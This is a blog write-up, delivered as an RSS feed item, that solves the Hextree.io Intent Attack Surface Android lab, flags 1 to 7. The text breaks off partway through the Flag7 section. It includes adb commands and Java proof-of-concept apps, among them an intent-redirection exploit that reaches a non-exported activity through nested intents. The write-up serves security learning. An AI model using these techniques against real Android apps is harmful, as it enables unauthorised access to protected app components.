<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>N00B BLOG</title><description>by ymuu</description><link>https://ymuuuu.github.io/</link><language>en</language><item><title>Hextree.io Intent Attack Writeup Part 1</title><link>https://ymuuuu.github.io/posts/hextreeio/hextree-intent-attack-part1/</link><guid isPermaLink="true">https://ymuuuu.github.io/posts/hextreeio/hextree-intent-attack-part1/</guid><description>This writeup details the steps taken to solve Hextree.io Intent Attack Surface APK</description><pubDate>Mon, 03 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;( بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ )&lt;/h1&gt;
&lt;p&gt;:::caution
#FreePalastine
:::&lt;/p&gt;
&lt;h2&gt;Some Definitions Before We Start&lt;/h2&gt;
&lt;h3&gt;What is an Activity?&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;&quot;An activity is a single, focused thing that the user can do. Almost all activities interact with the user, so the Activity class takes care of creating a window for you in which you can place your UI.&quot;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;So an activity is what you mostly see on your screen, it can be the main app activity, a login activity, a note taking activity.&lt;/p&gt;
&lt;h3&gt;What is an Intent?&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;&quot;Declaring an intention to do something, and letting Android figure out the app that can handle it.&quot;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;So to start an activity, you need to create an &lt;strong&gt;intent&lt;/strong&gt;.&lt;/p&gt;
&lt;h3&gt;Our Attack Surface?&lt;/h3&gt;
&lt;p&gt;The primary attack surface in this context is the &lt;code&gt;getIntent()&lt;/code&gt; method. This feature is used to pass data to other apps, making it a major attack surface for potential vulnerabilities.&lt;/p&gt;
&lt;p&gt;with that being said, lets start!&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Flag1Activity&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;activity
    android:name=&quot;io.hextree.attacksurface.activities.Flag1Activity&quot;
    android:exported=&quot;true&quot;/&amp;gt;
&amp;lt;activity&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The first thing to notice is that the activity is set to &lt;code&gt;exported=&quot;true&quot;&lt;/code&gt;, which means it can be called from outside the app.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    this.f.addTag(&quot;basic-main-activity-avd2&quot;);
    success(this);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is a simple activity. When created (or called), it will add a tag and invoke the &lt;code&gt;success()&lt;/code&gt; method.&lt;/p&gt;
&lt;p&gt;Since this does not require a Proof of Concept (POC) app, I will keep it simple and use &lt;code&gt;adb am&lt;/code&gt; to trigger the activity.&lt;/p&gt;
&lt;p&gt;Run the following command to check the logcat:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;adb logcat --pid=$(adb shell pidof -s io.hextree.attacksurface)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, execute this command to start the activity:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;adb shell am start -n io.hextree.attacksurface/.activities.Flag1Activity
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;start&lt;/code&gt;: Starts the activity.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;n&lt;/code&gt;: Specifies the component name.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;io.hextree.attacksurface&lt;/code&gt;: Package name.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.activities.Flag1Activity&lt;/code&gt;: Component name.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can also write it like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag1Activity
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;However, I prefer to keep it concise. Now, check your app or logcat to see if the &lt;code&gt;success()&lt;/code&gt; method was called, and you should receive the flag!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;03-01 15:00:31.749  3417  3417 I Flag1   : success() called!
03-01 15:00:31.766  3417  3417 I Flag1   : HXT{xxxxxxx}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h1&gt;Flag2Activity&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;activity
    android:name=&quot;io.hextree.attacksurface.activities.Flag2Activity&quot;
    android:exported=&quot;true&quot;&amp;gt;
    &amp;lt;intent-filter&amp;gt;
        &amp;lt;action android:name=&quot;io.hextree.action.GIVE_FLAG&quot;/&amp;gt;
    &amp;lt;/intent-filter&amp;gt;
&amp;lt;/activity&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This one is different. We have an &lt;code&gt;intent-filter&lt;/code&gt; with an action name, which means the activity is also implicitly exported.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    String action = getIntent().getAction();
    if (action == null || !action.equals(&quot;io.hextree.action.GIVE_FLAG&quot;)) {
        return;
    }
    this.f.addTag(action);
    success(this);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here, the activity waits for an intent using &lt;code&gt;getIntent()&lt;/code&gt; and checks if the action is either &lt;code&gt;null&lt;/code&gt; or &lt;strong&gt;NOT&lt;/strong&gt; equal to &lt;code&gt;io.hextree.action.GIVE_FLAG&lt;/code&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If the condition is &lt;code&gt;true&lt;/code&gt;, it returns nothing.&lt;/li&gt;
&lt;li&gt;If the condition is &lt;code&gt;false&lt;/code&gt;, it calls the &lt;code&gt;success()&lt;/code&gt; method.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Again, we can use the &lt;code&gt;adb&lt;/code&gt; command to trigger this activity:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;adb shell am start -n io.hextree.attacksurface/.activities.Flag2Activity -a io.hextree.action.GIVE_FLAG
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;a&lt;/code&gt;: Specifies the action name.&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;03-01 15:11:08.432  3417  3417 I Flag2   : success() called!
03-01 15:11:08.442  3417  3417 I Flag2   : HXT{xxxxxx}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h1&gt;Flag3Activity&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;activity
    android:name=&quot;io.hextree.attacksurface.activities.Flag3Activity&quot;
    android:exported=&quot;true&quot;&amp;gt;
    &amp;lt;intent-filter&amp;gt;
        &amp;lt;action android:name=&quot;io.hextree.action.GIVE_FLAG&quot;/&amp;gt;
        &amp;lt;data android:scheme=&quot;https&quot;/&amp;gt;
    &amp;lt;/intent-filter&amp;gt;
&amp;lt;/activity&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is similar to &lt;strong&gt;Flag2Activity&lt;/strong&gt;, but there’s an additional &lt;code&gt;&amp;lt;data&amp;gt;&lt;/code&gt; element with the &lt;code&gt;scheme&lt;/code&gt; attribute set to &lt;code&gt;https&lt;/code&gt;. Let’s explore what this means by examining the activity itself.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    Intent intent = getIntent();
    String action = intent.getAction();
    if (action == null || !action.equals(&quot;io.hextree.action.GIVE_FLAG&quot;)) {
        return;
    }
    this.f.addTag(action);
    Uri data = intent.getData();
    if (data == null || !data.toString().equals(&quot;&amp;lt;https://app.hextree.io/map/android&amp;gt;&quot;)) {
        return;
    }
    this.f.addTag(data);
    success(this);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As you can see, it waits for the same action as &lt;strong&gt;Flag2Activity&lt;/strong&gt;. However, if the condition is &lt;code&gt;false&lt;/code&gt;, it also checks the &lt;code&gt;Uri&lt;/code&gt; data to ensure it matches &lt;code&gt;https://app.hextree.io/map/android&lt;/code&gt; (remember the &lt;code&gt;scheme&lt;/code&gt;?).&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If the data is &lt;code&gt;null&lt;/code&gt; or &lt;strong&gt;NOT&lt;/strong&gt; equal to the specified URI, it returns nothing.&lt;/li&gt;
&lt;li&gt;If the data matches, it calls the &lt;code&gt;success()&lt;/code&gt; method.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To trigger this activity, we’ll use the &lt;code&gt;adb&lt;/code&gt; command again:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;adb shell am start -n io.hextree.attacksurface/.activities.Flag3Activity -a io.hextree.action.GIVE_FLAG -d https://app.hextree.io/map/android
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;d&lt;/code&gt;: Specifies the data URI.&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;03-01 15:18:03.264  3417  3417 I Flag3   : success() called!
03-01 15:18:03.273  3417  3417 I Flag3   : HXT{xxxxx}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h1&gt;Flag4Activity&lt;/h1&gt;
&lt;p&gt;Now things are getting more interesting! This activity introduces some complexity and requires deeper research. Let’s dive in.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;activity
    android:name=&quot;io.hextree.attacksurface.activities.Flag4Activity&quot;
    android:exported=&quot;true&quot;/&amp;gt;
&amp;lt;activity&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;At first glance, this is just a normal explicitly exported activity. Let’s dig deeper.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public enum State {
    INIT(0),
    PREPARE(1),
    BUILD(2),
    GET_FLAG(3),
    REVERT(4);

    private final int value;

    State(int i) {
        this.value = i;
    }

    public int getValue() {
        return this.value;
    }

    public static State fromInt(int i) {
        for (State state : values()) {
            if (state.getValue() == i) {
                return state;
            }
        }
        return INIT;
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The first thing that came to my mind when I saw this was &lt;strong&gt;state machines&lt;/strong&gt;. If you’re familiar with state machines, you’ll know they define a flow that determines the current state, the next state, and the actions associated with each state.&lt;/p&gt;
&lt;p&gt;Going deeper, we find the main function (I assume) called &lt;code&gt;stateMachine&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public void stateMachine(Intent intent) {
    String action = intent.getAction();
    int ordinal = getCurrentState().ordinal();
    if (ordinal != 0) {
        if (ordinal != 1) {
            if (ordinal != 2) {
                if (ordinal == 3) {
                    this.f.addTag(State.GET_FLAG);
                    setCurrentState(State.INIT);
                    success(this);
                    Log.i(&quot;Flag4StateMachine&quot;, &quot;solved&quot;);
                    return;
                }
                if (ordinal == 4 &amp;amp;&amp;amp; &quot;INIT_ACTION&quot;.equals(action)) {
                    setCurrentState(State.INIT);
                    Toast.makeText(this, &quot;Transitioned from REVERT to INIT&quot;, 0).show();
                    Log.i(&quot;Flag4StateMachine&quot;, &quot;Transitioned from REVERT to INIT&quot;);
                    return;
                }
            } else if (&quot;GET_FLAG_ACTION&quot;.equals(action)) {
                setCurrentState(State.GET_FLAG);
                Toast.makeText(this, &quot;Transitioned from BUILD to GET_FLAG&quot;, 0).show();
                Log.i(&quot;Flag4StateMachine&quot;, &quot;Transitioned from BUILD to GET_FLAG&quot;);
                return;
            }
        } else if (&quot;BUILD_ACTION&quot;.equals(action)) {
            setCurrentState(State.BUILD);
            Toast.makeText(this, &quot;Transitioned from PREPARE to BUILD&quot;, 0).show();
            Log.i(&quot;Flag4StateMachine&quot;, &quot;Transitioned from PREPARE to BUILD&quot;);
            return;
        }
    } else if (&quot;PREPARE_ACTION&quot;.equals(action)) {
        setCurrentState(State.PREPARE);
        Toast.makeText(this, &quot;Transitioned from INIT to PREPARE&quot;, 0).show();
        Log.i(&quot;Flag4StateMachine&quot;, &quot;Transitioned from INIT to PREPARE&quot;);
        return;
    }
    Toast.makeText(this, &quot;Unknown state. Transitioned to INIT&quot;, 0).show();
    Log.i(&quot;Flag4StateMachine&quot;, &quot;Unknown state. Transitioned to INIT&quot;);
    setCurrentState(State.INIT);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If you’re a good script kiddie, you’ll recognize that this is just a series of nested conditions. To trigger the desired behavior, we need to call the actions in the correct order.&lt;/p&gt;
&lt;p&gt;You could do this with a Proof of Concept (POC) app using Android Studio, but I managed to achieve it using the &lt;code&gt;am&lt;/code&gt; manager, which simplifies things. Here’s how:&lt;/p&gt;
&lt;p&gt;We need to start from the topmost action and proceed in the following order:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;PREPARE_ACTION&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BUILD_ACTION&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GET_FLAG_ACTION&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;INIT_ACTION&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;The order is crucial!&lt;/strong&gt; Missing the order will cause the process to fail.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a PREPARE_ACTION; \\
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a BUILD_ACTION; \\
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a GET_FLAG_ACTION; \\
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a INIT_ACTION

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If this block of commands doesn’t work, try running them one at a time.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;03-01 15:34:17.535  3570  3570 I Flag4   : success() called!
03-01 15:34:17.546  3570  3570 I Flag4   : HXT{xxxxxxxxxxxxxxx}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h1&gt;Flag5Activity&lt;/h1&gt;
&lt;p&gt;From this point onward, we’ll stop using the &lt;code&gt;adb&lt;/code&gt; manager and start writing some Proof of Concept (POC) apps using Android Studio.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;activity
    android:name=&quot;io.hextree.attacksurface.activities.Flag5Activity&quot;
    android:exported=&quot;true&quot;/&amp;gt;
&amp;lt;activity&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The activity is explicitly exported. Let’s dive deeper into its implementation.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    Intent intent = getIntent();
    Intent intent2 = (Intent) intent.getParcelableExtra(&quot;android.intent.extra.INTENT&quot;);
    if (intent2 == null || intent2.getIntExtra(&quot;return&quot;, -1) != 42) {
        return;
    }
    this.f.addTag(42);
    Intent intent3 = (Intent) intent2.getParcelableExtra(&quot;nextIntent&quot;);
    this.nextIntent = intent3;
    if (intent3 == null || intent3.getStringExtra(&quot;reason&quot;) == null) {
        return;
    }
    this.f.addTag(&quot;nextIntent&quot;);
    if (this.nextIntent.getStringExtra(&quot;reason&quot;).equals(&quot;back&quot;)) {
        this.f.addTag(this.nextIntent.getStringExtra(&quot;reason&quot;));
        success(this);
    } else if (this.nextIntent.getStringExtra(&quot;reason&quot;).equals(&quot;next&quot;)) {
        intent.replaceExtras(new Bundle());
        startActivity(this.nextIntent);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Okay, what in the world is this? It looks like nested intents rather than nested conditions. An intent inside an intent? I decided to do some research and found this &lt;a href=&quot;https://stackoverflow.com/questions/13381535/sending-intent-inside-of-another-intent&quot;&gt;StackOverflow post&lt;/a&gt;, which helped me construct the POC app. Here’s how it works:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Outer Intent&lt;/strong&gt;: The initial intent that starts the Activity. (&lt;code&gt;intent&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;First Nested Intent&lt;/strong&gt;: Extracted from the outer intent using &lt;code&gt;getParcelableExtra&lt;/code&gt;. (&lt;code&gt;intent2&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Second Nested Intent&lt;/strong&gt;: Extracted from the first nested intent using &lt;code&gt;getParcelableExtra&lt;/code&gt;. (&lt;code&gt;intent3&lt;/code&gt;)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;But something caught my attention:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if (this.nextIntent.getStringExtra(&quot;reason&quot;).equals(&quot;back&quot;)) {
    this.f.addTag(this.nextIntent.getStringExtra(&quot;reason&quot;));
    success(this);
} else if (this.nextIntent.getStringExtra(&quot;reason&quot;).equals(&quot;next&quot;)) {
    intent.replaceExtras(new Bundle());
    startActivity(this.nextIntent);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;If the &lt;code&gt;reason&lt;/code&gt; equals &lt;code&gt;&quot;back&quot;&lt;/code&gt;, the &lt;code&gt;success()&lt;/code&gt; method is called.&lt;/li&gt;
&lt;li&gt;If the &lt;code&gt;reason&lt;/code&gt; equals &lt;code&gt;&quot;next&quot;&lt;/code&gt;, it replaces the &lt;code&gt;startActivity&lt;/code&gt; parameter with the &lt;code&gt;nextIntent&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This means we can pass another intent inside it. Keep this in mind, as we’ll revisit it later. For now, since we don’t need it to get &lt;code&gt;Flag5&lt;/code&gt;, let’s proceed.&lt;/p&gt;
&lt;p&gt;Here’s the POC app:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Create the innermost intent (intent3)
        Intent intent3 = new Intent();
        intent3.putExtra(&quot;reason&quot;, &quot;back&quot;);

        // Create the middle intent (intent2) and embed intent3
        Intent intent2 = new Intent();
        intent2.putExtra(&quot;nextIntent&quot;, intent3);
        intent2.putExtra(&quot;return&quot;, 42);

        // Create the outer intent (intent1) and embed intent2
        Intent intent1 = new Intent();
        intent1.setClassName(&quot;io.hextree.attacksurface&quot;, &quot;io.hextree.attacksurface.activities.Flag5Activity&quot;);
        intent1.putExtra(&quot;android.intent.extra.INTENT&quot;, intent2);

        // Start the activity with the outer intent
        startActivity(intent1);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Still confused? Here’s how I managed to understand it:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;In the target app, &lt;code&gt;intent2&lt;/code&gt; is extracted from &lt;code&gt;intent1&lt;/code&gt; like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Intent intent2 = (Intent) intent.getParcelableExtra(&quot;android.intent.extra.INTENT&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To reverse this in the POC app, we &lt;strong&gt;put&lt;/strong&gt; &lt;code&gt;intent2&lt;/code&gt; inside &lt;code&gt;intent1&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;intent1.putExtra(&quot;android.intent.extra.INTENT&quot;, intent2);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I hope this makes it clearer when writing your POC app.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;03-01 16:24:14.766  3685  3685 I Flag5   : success() called!
03-01 16:24:14.852  3685  3685 I Flag5   : HXT{xxxxxxxxxxxx}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;hr /&gt;
&lt;h1&gt;Flag6Activity&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;activity
    android:name=&quot;io.hextree.attacksurface.activities.Flag6Activity&quot;
    android:exported=&quot;false&quot;/&amp;gt;
&amp;lt;activity&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Oops! This activity is &lt;strong&gt;not exported&lt;/strong&gt;. How can we call it if it’s not exported? Is this a dead end?&lt;/p&gt;
&lt;p&gt;Well, not necessarily. Remember this part from &lt;strong&gt;Flag5Activity&lt;/strong&gt;?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if (this.nextIntent.getStringExtra(&quot;reason&quot;).equals(&quot;back&quot;)) {
    this.f.addTag(this.nextIntent.getStringExtra(&quot;reason&quot;));
    success(this);
} else if (this.nextIntent.getStringExtra(&quot;reason&quot;).equals(&quot;next&quot;)) {
    intent.replaceExtras(new Bundle());
    startActivity(this.nextIntent);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;What if we could abuse &lt;code&gt;startActivity(this.nextIntent);&lt;/code&gt; and place our intent inside it to target &lt;strong&gt;Flag6Activity&lt;/strong&gt;? This means we could potentially start &lt;strong&gt;Flag6Activity&lt;/strong&gt; indirectly. Let’s first examine &lt;strong&gt;Flag6Activity&lt;/strong&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    if ((getIntent().getFlags() &amp;amp; 1) != 0) {
        this.f.addTag(&quot;FLAG_GRANT_READ_URI_PERMISSION&quot;);
        success(this);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As you can see, it’s a simple activity that waits for the &lt;code&gt;FLAG_GRANT_READ_URI_PERMISSION&lt;/code&gt; flag to call the &lt;code&gt;success()&lt;/code&gt; method. This means we can reuse the POC app from &lt;strong&gt;Flag5Activity&lt;/strong&gt; with a slight modification to achieve our goal.&lt;/p&gt;
&lt;p&gt;This is called Intent Redirection, I recommend reading this blog by Anas
https://medium.com/@0x3adly/android-intent-redirection-a-hackers-gateway-to-internal-components-ebe126bbb2e0&lt;/p&gt;
&lt;p&gt;Here’s the updated POC app:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Create the innermost intent (intent3)
        Intent intent3 = new Intent();
        intent3.putExtra(&quot;reason&quot;, &quot;next&quot;); // Set reason to &quot;next&quot; to trigger startActivity
        intent3.setClassName(&quot;io.hextree.attacksurface&quot;, &quot;io.hextree.attacksurface.activities.Flag6Activity&quot;);
        intent3.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); // Add the required flag

        // Create the middle intent (intent2) and embed intent3
        Intent intent2 = new Intent();
        intent2.putExtra(&quot;nextIntent&quot;, intent3);
        intent2.putExtra(&quot;return&quot;, 42);

        // Create the outer intent (intent1) and embed intent2
        Intent intent1 = new Intent();
        intent1.setClassName(&quot;io.hextree.attacksurface&quot;, &quot;io.hextree.attacksurface.activities.Flag5Activity&quot;);
        intent1.putExtra(&quot;android.intent.extra.INTENT&quot;, intent2);

        // Start the activity with the outer intent
        startActivity(intent1);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Can you spot the difference? Here’s the key part:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Intent intent3 = new Intent();
intent3.putExtra(&quot;reason&quot;, &quot;next&quot;); // Set reason to &quot;next&quot; to trigger startActivity
intent3.setClassName(&quot;io.hextree.attacksurface&quot;, &quot;io.hextree.attacksurface.activities.Flag6Activity&quot;);
intent3.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); // Add the required flag
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We changed the &lt;code&gt;reason&lt;/code&gt; to &lt;code&gt;&quot;next&quot;&lt;/code&gt; so the condition in &lt;strong&gt;Flag5Activity&lt;/strong&gt; evaluates to &lt;code&gt;true&lt;/code&gt;, triggering &lt;code&gt;startActivity(this.nextIntent)&lt;/code&gt;. Then, we set the target activity to &lt;strong&gt;Flag6Activity&lt;/strong&gt; and added the &lt;code&gt;FLAG_GRANT_READ_URI_PERMISSION&lt;/code&gt; flag.&lt;/p&gt;
&lt;p&gt;At first glance, this might seem complicated, but it’s actually quite simple. Think of it as an &lt;strong&gt;SSRF (Server-Side Request Forgery)&lt;/strong&gt; vulnerability. In SSRF, you abuse a service to access internal resources that you wouldn’t normally have access to as an external user. Similarly, here we don’t have direct access to &lt;strong&gt;Flag6Activity&lt;/strong&gt; because it’s not exported. However, by leveraging &lt;strong&gt;Flag5Activity&lt;/strong&gt;, we can gain indirect access from the inside. Got it?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;03-01 16:38:44.088  3685  3685 I Flag6   : success() called!
03-01 16:38:44.186  3685  3685 I Flag6   : HXT{xxxxx}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In fact, you can modify the script to call &lt;strong&gt;Flag2Activity&lt;/strong&gt; as well. Just make sure to add the required action:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Intent intent3 = new Intent();
intent3.putExtra(&quot;reason&quot;, &quot;next&quot;);
intent3.setClassName(&quot;io.hextree.attacksurface&quot;, &quot;io.hextree.attacksurface.activities.Flag2Activity&quot;);
intent3.setAction(&quot;io.hextree.action.GIVE_FLAG&quot;);
// intent3.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); // Not needed for Flag2Activity
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Success!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;03-01 16:40:26.367  3685  3685 I Flag2   : success() called!
03-01 16:40:26.395  3685  3685 I Flag2   : HXT{xxxxxx}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h1&gt;Flag7Activity&lt;/h1&gt;
&lt;p&gt;Finally, we’ve reached the last one!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;activity
    android:name=&quot;io.hextree.attacksurface.activities.Flag7Activity&quot;
    android:exported=&quot;true&quot;/&amp;gt;
&amp;lt;activity&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nothing unusual here. Let’s dig deeper into the code.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    if (this.f == null) {
        this.f = new LogHelper(this);
    }
    String action = getIntent().getAction();
    if (action == null || !action.equals(&quot;OPEN&quot;)) {
        return;
    }
    this.f.addTag(&quot;OPEN&quot;);
}

@Override // io.hextree.attacksurface.AppCompactActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
protected void onNewIntent(Intent intent) {
    super.onNewIntent(intent);
    String action = intent.getAction();
    if (action == null || !action.equals(&quot;REOPEN&quot;)) {
        return;
    }
    this.f.addTag(&quot;REOPEN&quot;);
    success(this);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As you can see, this activity uses &lt;strong&gt;instance reusing&lt;/strong&gt;. The first time it’s launched, it expects the action &lt;code&gt;&quot;OPEN&quot;&lt;/code&gt;. The second time, it expects the action &lt;code&gt;&quot;REOPEN&quot;&lt;/code&gt;. However, if we call this using the &lt;code&gt;am&lt;/code&gt; manager, wouldn’t it create two separate instances using &lt;code&gt;onCreate&lt;/code&gt;? How can we trigger &lt;code&gt;onNewIntent&lt;/code&gt; instead?&lt;/p&gt;
&lt;p&gt;This is where &lt;strong&gt;&lt;code&gt;FLAG_ACTIVITY_SINGLE_TOP&lt;/code&gt;&lt;/strong&gt; and the &lt;strong&gt;Activity Lifecycle&lt;/strong&gt; come into play. For more details, check out this &lt;a href=&quot;https://medium.com/@ranjeet123/android-activity-lifecycle-in-detail-eaf2931a1b37&quot;&gt;Android Activity Lifecycle guide&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Here’s how to trigger it using &lt;code&gt;adb&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;adb shell am start -n io.hextree.attacksurface/.activities.Flag7Activity -a OPEN; \
adb shell am start -n io.hextree.attacksurface/.activities.Flag7Activity -a REOPEN --activity-single-top

&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;How It Works:&lt;/h3&gt;
&lt;p&gt;With &lt;code&gt;FLAG_ACTIVITY_SINGLE_TOP&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The existing instance of &lt;code&gt;Flag7Activity&lt;/code&gt; is reused.&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;onNewIntent&lt;/code&gt; method is called, which handles the &lt;code&gt;&quot;REOPEN&quot;&lt;/code&gt; action and triggers &lt;code&gt;success(this)&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Workflow:&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;First Launch (&lt;code&gt;OPEN&lt;/code&gt; action)&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;onCreate&lt;/code&gt; is called.&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;action&lt;/code&gt; is &lt;code&gt;&quot;OPEN&quot;&lt;/code&gt;, so &lt;code&gt;this.f.addTag(&quot;OPEN&quot;)&lt;/code&gt; is executed.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Reusing the Activity (&lt;code&gt;REOPEN&lt;/code&gt; action)&lt;/strong&gt;:
